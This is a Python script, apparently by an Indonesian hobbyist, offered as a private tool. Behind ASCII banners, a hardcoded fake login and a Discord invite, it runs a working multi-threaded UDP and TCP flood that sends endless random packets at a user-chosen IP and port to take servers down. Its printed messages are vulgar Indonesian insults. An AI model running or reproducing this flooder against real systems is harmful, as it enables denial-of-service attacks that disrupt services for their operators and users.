#Jangan Marah Yahh Bang Saya Hanya Bocil Yang Ingin Bisa Membuat Tools Sendiri

import random

 import socket 
 
 import threading

 import time 
 
 import os 
 
  
 os.system("clear") 
 print("""\033[93m 
 \033[93m 
  █████                          ███ 
 ░░███                          ░░░ 
  ░███         ██████   ███████ ████  ████████ 
  ░███        ███░░███ ███░░███░░███ ░░███░░███ 
  ░███       ░███ ░███░███ ░███ ░███  ░███ ░███ 
  ░███      █░███ ░███░███ ░███ ░███  ░███ ░███ 
  ███████████░░██████ ░░███████ █████ ████ █████ 
 ░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░ 
                       ███ ░███ 
                      ░░██████ 
                       ░░░░░░ 
              \033[93m>> \033[96mPrivate Tools By DerZ#8688 \033[93m<< 
             \033[97m 
    ███ 
   █   █ 
 \033[97m  █   █                      \033[93m Dosen't have account? DM DerZ#2861
 \033[97m█████████               ██   \033[93m Or You Can Just Join Our Discord Server, Link?? 
 \033[97m█████████              █  █  \033[93m https://dsc.gg/pornhub \033[97m 
 \033[97m███   ███ ██████████████  █ 
 \033[97m████ ████ █ █          █  █ 
 \033[97m█████████               ██     \033[33m 
  
 """) 
 username = str(input("\033[33m[DerZ] \033[93mUsername:")) 
 password = str(input("\033[33m[DerZ] \033[93mPassword:")) 
 if password == "#admin" and username == "KontolDek": 
     print ("Logged in as admin") 
     time.sleep(2) 
  
 else: 
     print ("Incorrect Password. Please try again.") 
     time.sleep(999) 
  
 os.system("clear") 
 print("\033[92mConnecting To Server [\033[97m•\033[92m]") 
 time.sleep(0.9) 
  
 os.system("clear") 
 print("Connecting To Server [\033[97m••\033[92m]") 
 time.sleep(0.9) 
  
 os.system("clear") 
 print("Connecting To Server [\033[97m•••\033[92m]") 
 time.sleep(0.9) 
  
 os.system("clear") 
 print("Connecting To Server [\033[97m••\033[92m]") 
 time.sleep(0.9) 
  
 os.system("clear") 
 print("Connecting To Server [\033[97m•\033[92m]") 
 time.sleep(0.9) 
  
 os.system("clear") 
 print(""" 
   ____           _         _            ____ 
  / ___| __ _  __| | __ _  | |   _   _  | __ )  __ _ _   _   
 | |  _ / _` |/ _` |/ _` | | |  | | | | |  _ \ / _` | | | | [+] Author  : DerZ-24 #2861
 | |_| | (_| | (_| | (_| | | |__| |_| | | |_) | (_| | |_| | [+] Youtube : DerZ 
  \____|\__,_|\__,_|\__,_| |_____\__,_| |____/ \__,_|\__,_| [+] Team    : DerZ Commonity 
 """) 
 print(""" 
 ___________________________________________ 
  
 >>>>>Kalau Mau Pakek Ganteng Dulu<<<<<") 
 >>>>>Mau rename? PM me<<<<< 
 ___________________________________________ 
 """) 
 ip = str(input("[+] DerZ | Ip:")) 
 port = int(input("[+] DerZ | Port:")) 
 choice = str(input("[+] DerZ | Gas Gak Ni?(y/n):")) 
 times = int(input("[+] DerZ | Packets:")) 
 threads = int(input("[+] DerZ | Threads:")) 
 def run(): 
         data = random._urandom(1024) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         addr = (str(ip),int(port)) 
                         for x in range(times): 
                                 s.sendto(data,addr) 
                         print(i +" | Kontol Lu Babi |") 
                 except: 
                         print("[!] | Server Down!!! |") 
  
 def run2(): 
         data = random._urandom(16) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +" Hanya Kontol!!!") 
                 except: 
                         s.close() 
                         print("[*] Down Lagi Nih Kontol") 
  
 for y in range(threads): 
         if choice == 'y': 
                 th = threading.Thread(target = run) 
                 th.start() 
         else: 
                 th = threading.Thread(target = run2) 
                 th.start()